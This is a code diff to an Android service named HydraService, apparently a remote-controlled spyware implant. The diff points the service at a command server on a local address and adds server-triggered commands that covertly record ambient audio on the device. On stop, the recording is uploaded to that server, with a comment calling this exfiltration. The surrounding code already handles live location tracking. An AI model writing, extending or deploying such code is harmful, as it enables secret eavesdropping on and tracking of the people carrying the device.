@@ -34,7 +34,12 @@ class HydraService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private val heartbeatInterval = 60000L
     private var wakeLock: PowerManager.WakeLock? = null
-    private val serverBaseUrl = "https://10.0.2.2:8443"
+    //private val serverBaseUrl = "https://10.0.2.2:8443"
+    private val serverBaseUrl = "https://192.168.0.207:8443"
+
+    // --- Audio Surveillance VARIABLES ---
+    private val audioHelper by lazy { AudioHelper(this) }
+    private var currentRecordingPath: String? = null
     
     // --- LIVE TRACKING VARIABLES ---
     private var isTracking = false
@@ -221,6 +226,20 @@ class HydraService : Service() {
                 Log.i(TAG, "[!] Action detected: $action")
 
                 when (action) {
+                    "record_start" -> {
+                        currentRecordingPath = audioHelper.startRecording()
+                        if (currentRecordingPath != null) {
+                            sendReport("audio_status", "Recording environment...")
+                        }
+                    }
+                    "record_stop" -> {
+                        val finalPath = audioHelper.stopRecording()
+                        if (finalPath != null) {
+                            // Automatically exfiltrate the file to the server
+                            uploadFile(finalPath, "ANDROID-HEAD-01", serverBaseUrl)
+                            sendReport("audio_status", "Recording exfiltrated: $finalPath")
+                        }
+                    }
                     "location" -> {
                         locationHelper.getCurrentLocation { report ->
                             sendReport("location_update", report)
